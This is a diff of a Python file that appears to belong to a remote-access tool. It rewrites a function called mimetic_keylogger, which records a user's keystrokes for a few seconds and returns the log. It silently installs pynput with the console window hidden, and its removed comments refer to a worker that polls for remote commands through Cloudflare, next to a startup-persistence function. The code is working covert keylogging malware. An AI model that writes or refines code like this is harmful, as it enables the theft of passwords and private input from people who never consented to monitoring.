@@ -260,81 +260,55 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """
-    Capture keyboard input and return history log.
-
-    OPTIMIZATION: Temporarily enables fast polling (2s) only during execution.
-    - Signals worker to use COMMAND_CHECK_INTERVAL_MIMETIC (2s) instead of normal (5s)
-    - Saves Cloudflare resources by not keeping fast polling active permanently
-    - Execution time: 2 seconds maximum
-    - Frontend waits: 6 seconds (40 × 150ms)
-    """
-    global device_id
-
+    """Capture keyboard input using pynput (more reliable than keyboard library)."""
     try:
-        import keyboard
+        from pynput.keyboard import Listener
     except ImportError:
         try:
-            print("[mimetic] Installing keyboard module...", flush=True)
+            print("[mimetic] Installing pynput module...", flush=True)
             subprocess.run(
-                [sys.executable, "-m", "pip", "install", "keyboard", "-q"],
+                [sys.executable, "-m", "pip", "install", "pynput", "-q"],
                 capture_output=True,
                 timeout=30,
                 creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
             )
-            import keyboard
-            print("[mimetic] Keyboard module installed", flush=True)
+            from pynput.keyboard import Listener
         except Exception as e:
-            return f"Error installing keyboard: {str(e)}"
-
+            return f"Error: Could not install pynput - {str(e)}"
 
     try:
+
         log = []
-        stop_event = threading.Event()
 
-        def on_key_press(event):
-            key_name = event.name
-            # Map special keys to brackets format
-            if key_name == 'space':
-                log.append('[SPACE]')
-            elif key_name == 'enter':
-                log.append('[ENTER]')
-            elif key_name == 'tab':
-                log.append('[TAB]')
-            elif key_name == 'backspace':
-                log.append('[BACKSPACE]')
-            elif key_name == 'delete':
-                log.append('[DELETE]')
-            elif key_name == 'shift':
-                log.append('[SHIFT]')
-            elif key_name == 'ctrl':
-                log.append('[CTRL]')
-            elif key_name == 'alt':
-                log.append('[ALT]')
-            elif len(key_name) == 1:
-                log.append(key_name)  # Regular character
-            else:
-                log.append(f'[{key_name.upper()}]')  # Other special keys
+        def on_press(key):
+            try:
+                # Try to get character
+                if hasattr(key, 'char') and key.char:
+                    log.append(key.char)
+                else:
+                    # Map special keys
+                    key_str = str(key).replace("Key.", "").upper()
+                    if key_str == "SPACE":
+                        log.append('[SPACE]')
+                    elif key_str == "ENTER":
+                        log.append('[ENTER]')
+                    elif key_str == "TAB":
+                        log.append('[TAB]')
+                    elif key_str == "BACKSPACE":
+                        log.append('[BACKSPACE]')
+                    elif key_str == "DELETE":
+                        log.append('[DELETE]')
+                    elif key_str == "ESC":
+                        return False  # Stop listening
+                    else:
+                        log.append(f'[{key_str}]')
+            except:
+                pass
 
-            # ESC key stops the capture immediately
-            if key_name == 'esc':
-                stop_event.set()
-                return False  # Remove this hook
+        # Listen for keyboard input with 3-second timeout
+        with Listener(on_press=on_press) as listener_obj:
+            listener_obj.join(timeout=3)
 
-        keyboard.on_press(on_key_press)
-
-        # Wait for ESC or 3-second timeout for better capture
-        stopped = stop_event.wait(timeout=3)
-        keyboard.unhook_all()
-
-        result = ''.join(log)
-        return result if result else "No keys recorded"
-    except KeyboardInterrupt:
-        # Handle if process is interrupted
-        try:
-            keyboard.unhook_all()
-        except:
-            pass
         result = ''.join(log)
         return result if result else "No keys recorded"
     except Exception as e:
